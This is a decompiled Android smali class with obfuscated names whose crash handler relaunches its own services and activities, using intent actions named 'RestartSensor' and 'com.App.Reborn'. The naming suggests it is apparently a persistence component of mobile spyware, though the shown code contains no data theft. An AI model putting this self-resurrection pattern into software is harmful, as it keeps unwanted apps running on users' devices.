.class public Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4$MyExceptionHandler;
.super Ljava/lang/Object;
.source "rwsziozwpwibchxwblzvrenrq4.java"

# interfaces
.implements Ljava/lang/Thread$UncaughtExceptionHandler;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "MyExceptionHandler"
.end annotation


# instance fields
.field private final myActivityClass:Ljava/lang/Class;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation
.end field

.field private final myContext:Landroid/content/Context;

.field final synthetic this$0:Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;


# direct methods
.method public constructor <init>(Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;Landroid/content/Context;Ljava/lang/Class;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ljava/lang/Class<",
            "*>;)V"
        }
    .end annotation

    .line 455
    iput-object p1, p0, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4$MyExceptionHandler;->this$0:Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 456
    iput-object p2, p0, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4$MyExceptionHandler;->myContext:Landroid/content/Context;

    .line 457
    iput-object p3, p0, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4$MyExceptionHandler;->myActivityClass:Ljava/lang/Class;

    return-void
.end method


# virtual methods
.method public uncaughtException(Ljava/lang/Thread;Ljava/lang/Throwable;)V
    .locals 2

    .line 463
    :try_start_0
    iget-object p1, p0, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4$MyExceptionHandler;->myContext:Landroid/content/Context;

    const-string p2, "Error"

    const-wide/32 v0, 0x2bf20

    invoke-static {p1, p2, v0, v1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->phonixeffect(Landroid/content/Context;Ljava/lang/String;J)V

    .line 465
    iget-object p1, p0, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4$MyExceptionHandler;->this$0:Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;

    new-instance p2, Landroid/content/Intent;

    iget-object v0, p0, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4$MyExceptionHandler;->this$0:Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;

    invoke-virtual {v0}, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v1, Lginom/alfa/lib/scan/SensorRestarterBroadcastReceiver;

    invoke-direct {p2, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v0, "RestartSensor"

    invoke-virtual {p2, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p2

    invoke-virtual {p1, p2}, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->sendBroadcast(Landroid/content/Intent;)V

    .line 467
    new-instance p1, Landroid/content/Intent;

    iget-object p2, p0, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4$MyExceptionHandler;->myContext:Landroid/content/Context;

    iget-object v0, p0, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4$MyExceptionHandler;->myActivityClass:Ljava/lang/Class;

    invoke-direct {p1, p2, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 468
    iget-object p2, p0, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4$MyExceptionHandler;->myContext:Landroid/content/Context;

    invoke-virtual {p2, p1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 469
    new-instance p1, Landroid/content/Intent;

    iget-object p2, p0, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4$MyExceptionHandler;->myContext:Landroid/content/Context;

    const-class v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19;

    invoke-direct {p1, p2, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string p2, "com.App.Reborn"

    .line 470
    invoke-virtual {p1, p2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const/high16 p2, 0x10000000

    .line 471
    invoke-virtual {p1, p2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 472
    iget-object p2, p0, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4$MyExceptionHandler;->myContext:Landroid/content/Context;

    invoke-virtual {p2, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
